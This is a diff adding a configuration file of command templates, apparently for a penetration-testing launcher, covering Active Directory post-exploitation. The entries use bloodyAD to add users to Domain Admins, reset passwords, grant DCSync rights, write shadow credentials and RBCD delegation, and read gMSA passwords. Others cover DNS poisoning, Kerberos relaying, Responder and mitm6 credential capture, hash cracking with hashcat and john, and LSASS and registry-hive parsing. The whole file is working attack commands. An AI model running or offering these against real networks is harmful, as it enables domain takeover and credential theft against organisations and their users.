@@ -1,0 +1,257 @@
+category = "ad-postex"
+display_name = "AD PostEx"
+icon = "󰒡"
+order = 33
+
+# === bloodyAD: AD object manipulation ===
+
+[[command]]
+id = "bad.add_user"
+title = "bloodyAD — add user"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add user newuser 'P@ssw0rd!'"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "create"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.add_computer"
+title = "bloodyAD — add computer (MAQ)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add computer 'CHRONO$' 'Mach1neP@ss!'"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "maq"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.set_password"
+title = "bloodyAD — set user password (reset)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' set password TARGET_USER 'Pwn3d!1'"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "reset"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.add_to_group"
+title = "bloodyAD — add user to group"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add groupMember 'Domain Admins' TARGET_USER"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "group"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.get_object"
+title = "bloodyAD — read object (specific attribute)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' get object TARGET --attr msDS-KeyCredentialLink"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "read"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.gmsa_membership"
+title = "bloodyAD — write msDS-GroupMSAMembership (SDDL)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' -k set object 'MSA_HEALTH$' msDS-GroupMSAMembership -v 'O:BAD:(A;;RP;;;USER_SID)'"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "gmsa"]
+when = "creds.kind in ['plaintext','kerberos'] and target.has_dc"
+
+[[command]]
+id = "bad.gmsa_dump"
+title = "bloodyAD — read msDS-ManagedPassword"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' -k get object 'MSA_TARGET$' --attr msDS-ManagedPassword"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "gmsa", "dump"]
+when = "target.has_dc"
+
+[[command]]
+id = "bad.shadow_creds_add"
+title = "bloodyAD — write shadow credentials"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add shadowCredentials TARGET --path /tmp"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "shadow-creds"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.dcsync_grant"
+title = "bloodyAD — grant DCSync (DS-Replication-Get-Changes)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add dcsync TARGET_USER"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "dcsync", "acl"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "bad.rbcd_write"
+title = "bloodyAD — write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)"
+template = "bloodyAD --host {dc} -d {domain} -u '{user}' -p '{password}' add rbcd TARGET_HOST\\$ CONTROLLED_COMPUTER\\$"
+requires = ["bloodyAD"]
+tags = ["bloodyad", "rbcd"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === Kerberos lifecycle ===
+
+[[command]]
+id = "krb.kinit.password"
+title = "kinit (password)"
+template = "echo '{password}' | kinit '{user_at_domain}'"
+requires = ["kinit"]
+tags = ["kinit"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "krb.kdestroy"
+title = "kdestroy (clear ccache)"
+template = "kdestroy"
+requires = ["kdestroy"]
+tags = ["cache"]
+
+[[command]]
+id = "krb.klist.cache"
+title = "klist (show cache)"
+template = "klist"
+requires = ["klist"]
+tags = ["cache"]
+
+[[command]]
+id = "krb.export_ccname"
+title = "export KRB5CCNAME (use ccache)"
+template = "export KRB5CCNAME=/tmp/{user}.ccache"
+tags = ["cache"]
+
+# === DNS poisoning / lookups ===
+
+[[command]]
+id = "dns.dnstool.add"
+title = "krbrelayx dnstool.py — add record"
+template = "python3 /opt/krbrelayx/dnstool.py -u '{domain}\\{user}' -p '{password}' -r FAKE.HOST -a add -d {lhost} -dns-ip {dc} -dc-ip {dc} {dc}"
+requires = ["python3"]
+tags = ["dns", "poison"]
+when = "creds.kind == 'plaintext' and target.has_dc and target.has_lhost"
+
+[[command]]
+id = "dns.dnstool.query"
+title = "dnstool.py — query record"
+template = "python3 /opt/krbrelayx/dnstool.py -u '{domain}\\{user}' -p '{password}' -r FAKE.HOST -a query -dns-ip {dc} -dc-ip {dc} {dc}"
+requires = ["python3"]
+tags = ["dns"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "dns.dnstool.remove"
+title = "dnstool.py — remove record"
+template = "python3 /opt/krbrelayx/dnstool.py -u '{domain}\\{user}' -p '{password}' -r FAKE.HOST -a remove -dns-ip {dc} -dc-ip {dc} {dc}"
+requires = ["python3"]
+tags = ["dns", "cleanup"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "dns.adidnsdump"
+title = "adidnsdump — list all DNS zones"
+template = "adidnsdump --print-zones -u '{domain}\\{user}' -p '{password}' {dc}"
+requires = ["adidnsdump"]
+tags = ["dns", "enum"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "dns.adidnsdump.records"
+title = "adidnsdump — dump records"
+template = "adidnsdump -u '{domain}\\{user}' -p '{password}' {dc}"
+requires = ["adidnsdump"]
+tags = ["dns", "enum"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+# === krbrelayx / kerberos relaying ===
+
+[[command]]
+id = "krbrelay.relayer"
+title = "krbrelayx.py — relay coerced Kerberos auth"
+template = "python3 /opt/krbrelayx/krbrelayx.py --krbsalt {domain_upper} --krbpass MACH_PWD -t ldap://{dc} --add-computer"
+requires = ["python3"]
+tags = ["relay", "kerberos"]
+when = "target.has_dc"
+
+# === Cracking ===
+
+[[command]]
+id = "crack.hashcat.asrep"
+title = "hashcat m18200 — AS-REP"
+template = "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --status"
+requires = ["hashcat"]
+tags = ["crack", "asrep"]
+
+[[command]]
+id = "crack.hashcat.tgs"
+title = "hashcat m13100 — TGS (Kerberoast)"
+template = "hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt --status"
+requires = ["hashcat"]
+tags = ["crack", "kerberoast"]
+
+[[command]]
+id = "crack.hashcat.ntlm"
+title = "hashcat m1000 — NTLM"
+template = "hashcat -m 1000 ntlm.hashes /usr/share/wordlists/rockyou.txt --status"
+requires = ["hashcat"]
+tags = ["crack", "ntlm"]
+
+[[command]]
+id = "crack.hashcat.netntlmv2"
+title = "hashcat m5600 — NetNTLMv2"
+template = "hashcat -m 5600 netntlmv2.hashes /usr/share/wordlists/rockyou.txt --status"
+requires = ["hashcat"]
+tags = ["crack", "netntlmv2"]
+
+[[command]]
+id = "crack.john.zip"
+title = "john — zip2john + crack"
+template = "zip2john target.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash"
+requires = ["zip2john", "john"]
+tags = ["crack", "zip"]
+
+[[command]]
+id = "crack.john.kdcdump"
+title = "john — kerberos AS-REP fast"
+template = "john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes"
+requires = ["john"]
+tags = ["crack", "asrep"]
+
+# === Capture ===
+
+[[command]]
+id = "capture.responder"
+title = "Responder — broadcast capture"
+template = "sudo responder -I tun0 -wd -v"
+requires = ["responder"]
+tags = ["capture", "responder"]
+
+[[command]]
+id = "capture.responder.analyze"
+title = "Responder — analyze only (no poisoning)"
+template = "sudo responder -I tun0 -A"
+requires = ["responder"]
+tags = ["capture", "analyze"]
+
+[[command]]
+id = "capture.mitm6"
+title = "mitm6 — IPv6 DNS takeover"
+template = "sudo mitm6 -d {domain} -i tun0"
+requires = ["mitm6"]
+tags = ["capture", "ipv6"]
+
+# === Loot / exfil ===
+
+[[command]]
+id = "loot.dumpert"
+title = "dumpert — LSASS minidump (Windows side)"
+template = "echo 'on the box: Dumpert.exe -> dumpert.dmp'"
+tags = ["lsass", "manual"]
+
+[[command]]
+id = "loot.pypykatz.dmp"
+title = "pypykatz — parse LSASS minidump"
+template = "pypykatz lsa minidump lsass.dmp"
+requires = ["pypykatz"]
+tags = ["lsass", "parse"]
+
+[[command]]
+id = "loot.pypykatz.live"
+title = "pypykatz — registry hive (SAM/SECURITY)"
+template = "pypykatz registry --sam SAM SYSTEM SECURITY"
+requires = ["pypykatz"]
+tags = ["lsass", "hives"]
